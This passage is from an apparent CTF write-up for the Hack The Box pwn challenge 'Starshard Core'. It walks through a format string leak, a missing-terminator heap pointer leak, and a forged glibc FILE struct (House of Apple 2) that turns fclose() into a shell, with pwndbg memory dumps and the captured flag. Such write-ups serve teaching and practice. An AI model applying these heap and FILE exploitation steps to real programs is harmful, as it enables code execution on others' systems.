+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">  printf</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;=== Welcome &quot;</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">  printf</span><span style="color: #9399B2;">(</span><span>console_state.tinkerer_name</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span>...</span></span></code></pre>
+<p>Format string vulnerability in <code>console_state.tinkerer_name</code>.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellsession"><span class="giallo-l"><span>          ____</span></span>
+<span class="giallo-l"><span>       .-&quot; +&#39; &quot;-.</span></span>
+<span class="giallo-l"><span>      /.&#39;.&#39;A_&#39;*`.\</span></span>
+<span class="giallo-l"><span>     |:.*&#39;/\\-\.&#39;:|</span></span>
+<span class="giallo-l"><span>     |:.&#39;.||&quot;|.&#39;*:|</span></span>
+<span class="giallo-l"><span>      \:~^~^~^~^:/</span></span>
+<span class="giallo-l"><span>       /`-....-&#39;\</span></span>
+<span class="giallo-l"><span>      /          \</span></span>
+<span class="giallo-l"><span>      `-.,____,.-&#39;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>Tinselwick Tinkerer Name: %p.%p.%p</span></span>
+<span class="giallo-l"><span>=== Welcome 0x7ffd25886ce0.0xffffffff.(nil) — Starshard Console ===</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>[1] Arm Starshard Routine</span></span>
+<span class="giallo-l"><span>[2] Attach Wish-Script Fragment</span></span>
+<span class="giallo-l"><span>[3] Cancel Routine</span></span>
+<span class="giallo-l"><span>[4] Commit Routine</span></span>
+<span class="giallo-l"><span>[5] Quit</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">&gt;</span><span> </span></span></code></pre>
+<p>Using this we can achieve leaks for libc and PIE, examining the stack and calculating offsets.</p>
+<p>For PIE leak we can take a look the <code>arm_routine</code> function:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">  printf</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;Enter Starshard Routine Name: &quot;</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span>  i </span><span style="color: #94E2D5;">=</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  while</span><span style="color: #9399B2;"> (</span><span>i </span><span style="color: #94E2D5;">&lt;</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">18</span><span style="color: #9399B2;">) {</span></span>
+<span class="giallo-l"><span>    c </span><span style="color: #94E2D5;">=</span><span style="color: #89B4FA;font-style: italic;"> fgetc</span><span style="color: #9399B2;">(</span><span>stdin</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    if</span><span style="color: #9399B2;"> ((</span><span>c </span><span style="color: #94E2D5;">== -</span><span style="color: #FAB387;">1</span><span style="color: #9399B2;">)</span><span style="color: #94E2D5;"> ||</span><span style="color: #9399B2;"> (</span><span>c </span><span style="color: #94E2D5;">==</span><span style="color: #A6E3A1;"> &#39; &#39;</span><span style="color: #9399B2;">))</span><span style="color: #CBA6F7;"> break</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>    console_state</span><span style="color: #9399B2;">.</span><span>spell_name</span><span style="color: #9399B2;">[</span><span>i</span><span style="color: #9399B2;">]</span><span style="color: #94E2D5;"> =</span><span> c</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>    i </span><span style="color: #94E2D5;">=</span><span> i </span><span style="color: #94E2D5;">+</span><span style="color: #FAB387;"> 1</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">  }</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">  printf</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;[*] Routine Armed %s&quot;</span><span style="color: #9399B2;">,</span><span> console_state.spell_name</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"></span></code></pre>
+<p>This loop populates <code>console_state.spell_name</code> buffer, but does not null the last character, so when it reaches the last <code>printf</code> if the buffer is full, it will keep printing until it reaches a null byte.</p>
+<p>Recalling to the <code>console_state</code> struct:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #CBA6F7;">typedef struct</span><span style="color: #9399B2;"> {</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    char</span><span style="color: #9399B2;">[</span><span style="color: #FAB387;">16</span><span style="color: #9399B2;">]</span><span>    tinkerer_name   </span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    char</span><span style="color: #9399B2;">[</span><span style="color: #FAB387;">24</span><span style="color: #9399B2;">]</span><span>    spell_name  </span></span>
+<span class="giallo-l"><span>    FILE </span><span style="color: #94E2D5;">*</span><span>      core_log    </span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    char</span><span style="color: #94E2D5;"> *</span><span>      spell_fragment  </span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    size_t</span><span>      fragment_sz</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span><span> console_state</span><span style="color: #9399B2;">;</span></span></code></pre>
+<p>There is our heap pointer right after <code>spell_name</code>! So now we have all the leaks we needed, we can begin with our FILE exploitation approach.</p>
+<p>For this technique I relied heavily in these posts:</p>
+<ul>
+<li><a rel="external" href="https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/">House of Apple 1</a></li>
+<li><a rel="external" href="https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">House of Apple 2</a></li>
+</ul>
+<p>We will use the call chain described in <a rel="external" href="https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">House of Apple 2</a>: <code>_IO_wfile_overflow -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></p>
+<p>Don't let this overwhelm you, it is not as hard as it looks. We will trick our FILE vtable (the one with the validity checks) to point to the <code>_IO_wide_data</code> vtable, tweaking its address so when it tries to execute <code>_finish</code> instead calls <code>_IO_wfile_overflow</code>, this function internally will call <code>_IO_wdoallocbuf</code>. This function will make use of the no validity checks <code>_wide_data</code> vtable to search for <code>_IO_WDOALLOCATE</code> (offset 0x68). So what we have to do is place in a controllable address <code>addr</code> our <code>ginger_gate</code> function, and overwrite the vtable pointer of <code>_wide_data</code> to <code>addr-0x68</code>, so when <code>_IO_wdoallocbuf</code> tries to execute <code>_IO_WDOALLOCATE</code> instead calls <code>ginger_gate</code> and gives us a shell.</p>
+<p>There are specific constraints we have to be aware of:
+* <code>fp-&gt;_wide_data-&gt;_IO_buf_base != 0</code>
+* <code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code>
+* <code>f-&gt;_flags == 0</code></p>
+<p>Now we just have to call <code>arm_routine</code> to leak PIE and allocate the real fp chunk in the heap, call <code>cancel_routine</code> to free it and call <code>feed_fragment</code> to reclaim the freed chunk and send our fake FILE.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"></span>
+<span class="giallo-l"><span>pwndbg</span><span style="color: #94E2D5;">&gt;</span><span> dt FILE </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e20893372a0</span></span>
+<span class="giallo-l"><span>FILE @ </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e20893372a0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e20893372a0</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0000</span><span> _flags               : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e20893372a8</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0008</span><span> _IO_read_ptr         : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337323</span><span style="color: #A6E3A1;"> &quot;&quot;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e20893372b0</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0010</span><span> _IO_read_end         : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337323</span><span style="color: #A6E3A1;"> &quot;&quot;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e20893372b8</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0018</span><span> _IO_read_base        : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337323</span><span style="color: #A6E3A1;"> &quot;&quot;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e20893372c0</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0020</span><span> _IO_write_base       : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337323</span><span style="color: #A6E3A1;"> &quot;&quot;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e20893372c8</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0028</span><span> _IO_write_ptr        : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337323</span><span style="color: #A6E3A1;"> &quot;&quot;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e20893372d0</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0030</span><span> _IO_write_end        : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337323</span><span style="color: #A6E3A1;"> &quot;&quot;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e20893372d8</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0038</span><span> _IO_buf_base         : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337323</span><span style="color: #A6E3A1;"> &quot;&quot;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e20893372e0</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0040</span><span> _IO_buf_end          : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337324</span><span style="color: #A6E3A1;"> &quot;&quot;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e20893372e8</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0048</span><span> _IO_save_base        : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e20893372f0</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0050</span><span> _IO_backup_base      : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e20893372f8</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0058</span><span> _IO_save_end         : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e2089337300</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0060</span><span> _markers             : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e2089337308</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0068</span><span> _chain               : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">76c2e3019840</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e2089337310</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0070</span><span> _fileno              : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">3</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e2089337314</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0074</span><span> _flags2              : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e2089337318</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0078</span><span> _old_offset          : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e2089337320</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0080</span><span> _cur_column          : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e2089337322</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0082</span><span> _vtable_offset       : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e2089337323</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0083</span><span> _shortbuf            : </span><span style="color: #A6E3A1;">&quot;&quot;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e2089337328</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0088</span><span> _lock                : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337380</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e2089337330</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0090</span><span> _offset              : </span><span style="color: #94E2D5;">-</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">1</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e2089337338</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0098</span><span> _codecvt             : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e2089337340</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">00a0</span><span> _wide_data           : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337390</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e2089337348</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">00a8</span><span> _freeres_list        : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e2089337350</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">00b0</span><span> _freeres_buf         : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e2089337358</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">00b8</span><span> __pad5               : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e2089337360</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">00c0</span><span> _mode                : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">00005e2089337364</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">00c4</span><span> _unused2             : </span><span style="color: #A6E3A1;">&#39;</span><span style="color: #F5C2E7;">\000</span><span style="color: #A6E3A1;">&#39;</span><span style="color: #94E2D5;"> &lt;</span><span>repeats </span><span style="color: #FAB387;">19</span><span> times</span><span style="color: #94E2D5;">&gt;</span></span>
+<span class="giallo-l"></span></code></pre><pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337290</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00000000000001e1</span><span>	................</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e20893372a0</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00005e2089337323</span><span>	........#s3. </span><span style="color: #94E2D5;">^</span><span>.. </span><span style="color: #94E2D5;">&lt;--</span><span> zeroed out _flags</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e20893372b0</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00005e2089337323</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00005e2089337323</span><span>	#s3. </span><span style="color: #94E2D5;">^</span><span>..#s3. </span><span style="color: #94E2D5;">^</span><span>..</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e20893372c0</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00005e2089337323</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00005e2089337323</span><span>	#s3. </span><span style="color: #94E2D5;">^</span><span>..#s3. </span><span style="color: #94E2D5;">^</span><span>..</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e20893372d0</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00005e2089337323</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00005e2089337323</span><span>	#s3. </span><span style="color: #94E2D5;">^</span><span>..#s3. </span><span style="color: #94E2D5;">^</span><span>..</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e20893372e0</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00005e2089337324</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span>	$s3. </span><span style="color: #94E2D5;">^</span><span>..........</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e20893372f0</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span>	................</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337300</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">000076c2e3019840</span><span>	........@....v..</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337310</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000003</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span>	................</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337320</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00005e2089337380</span><span>	.........s3. </span><span style="color: #94E2D5;">^</span><span>.. </span><span style="color: #94E2D5;">&lt;--</span><span> _lock field</span><span style="color: #9399B2;">,</span><span> has to point to an address that holds </span><span style="color: #F38BA8;">NULL</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337330</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">ffffffffffffffff</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span>	................</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337340</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00005e2089337390</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span>	.s3. </span><span style="color: #94E2D5;">^</span><span>..........</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337350</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span>	................</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337360</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span>	................</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337370</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">000076c2e301a028</span><span>	........</span><span style="color: #9399B2;">(</span><span>....v.. </span><span style="color: #94E2D5;">&lt;--</span><span> wide vtable</span><span style="color: #9399B2;">,</span><span> it passes the check</span><span style="color: #9399B2;">,</span><span> but it is not the real vtable</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337380</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span>	................</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337390</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span>	................ </span><span style="color: #94E2D5;">&lt;--</span><span> start of _wide_data</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e20893373a0</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span>	................</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e20893373b0</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span>	................</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e20893373c0</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span>	................</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e20893373d0</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00000000deadbeef</span><span>	................</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e20893373e0</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00000000deadbeef</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00000000deadbeef</span><span>	................</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e20893373f0</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00000000deadbeef</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00000000deadbeef</span><span>	................</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337400</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00000000deadbeef</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00000000deadbeef</span><span>	................</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337410</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00000000deadbeef</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00000000deadbeef</span><span>	................</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337420</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00000000deadbeef</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00000000deadbeef</span><span>	................</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337430</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00000000deadbeef</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00000000deadbeef</span><span>	................</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337440</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00000000deadbeef</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00000000deadbeef</span><span>	................</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337450</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00000000deadbeef</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00000000deadbeef</span><span>	................</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337460</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00005e2069559726</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00000000deadbeef</span><span style="color: #94E2D5;">	&amp;</span><span>.Ui </span><span style="color: #94E2D5;">^</span><span>..........</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337470</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">00005e20893373f8</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000020b91</span><span>	.s3. </span><span style="color: #94E2D5;">^</span><span>.......... </span><span style="color: #94E2D5;">&lt;--</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">00005e20893373f8</span><span> is our wide vtable</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> if</span><span> we add </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">68</span><span style="color: #9399B2;">,</span><span> we get </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">5e2089337460</span><span> which holds ginger_date function.</span></span>
+<span class="giallo-l"></span></code></pre>
+<p>Now we just have to use third option <code>cancel_routine</code> to <code>fclose()</code> our FILE, and our function will be called, giving us a shell.</p>
+<h3 id="getting-the-flag">Getting the flag</h3>
+<p><img src="/assets/starshard-core/flag.gif" alt="flag.gif" /></p>
+<h3 id="flag">Flag</h3>
+<p>HTB{c0rrupt3d_st4rsh4rd_w1sh3s_4b2f787495eaa2618b8c5404923f8371}</p>
+<h3 id="solver">Solver</h3>
+<p>You can download the solver script <a href="/assets/starshard-core/solver.py">here</a>. I know there is a FileStructure object in pwntools for this kind of challenges, but to be honest I didn't want to put time during the CTF to learn how to use it, so I just crafted it in a normal payload.</p>
+
+  </div>
+</section>
+
+    </main>
+    <hr>
+    <footer>
+      <p>© 2026 Jorge Moreno Cano. Powered by <a href="https://www.getzola.org/">Zola</a>, you can download the theme <a href="https://github.com/mxaddict/zolanight">here</a></p>
